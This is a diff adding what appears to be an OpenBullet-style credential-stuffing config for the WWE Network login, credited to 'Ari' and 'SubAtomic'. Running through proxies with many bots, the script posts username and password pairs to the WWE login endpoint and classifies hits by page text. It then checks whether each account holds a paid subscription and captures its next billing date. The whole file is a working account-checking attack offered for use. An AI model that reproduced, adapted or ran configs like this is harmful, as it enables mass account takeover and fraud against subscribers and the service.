@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "WWE",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-03T03:14:08.2188369-04:00",
+  "AdditionalInfo": "Updated by Ari, originally by SubAtomic.",
+  "Author": "Ari",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://secure.net.wwe.com/enterworkflow.do?flowId=account.login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+REQUEST POST "https://secure.net.wwe.com/workflow.do" 
+  CONTENT "registrationAction=identify&emailAddress=<USER>&password=<PASS>&submitButton=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://secure.net.wwe.com/enterworkflow.do?flowId=account.login" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Profile" 
+  KEYCHAIN Failure OR 
+    KEY "try again" 
+REQUEST GET "https://secure.net.wwe.com/enterworkflow.do?flowId=subscriptions.updatesubscription" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "You are currently subscribed to" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "You are not currently subscribed to" 
+PARSE "<SOURCE>" LR "Network&endDate=" "&" -> CAP "NEXT BILLING DATE" 
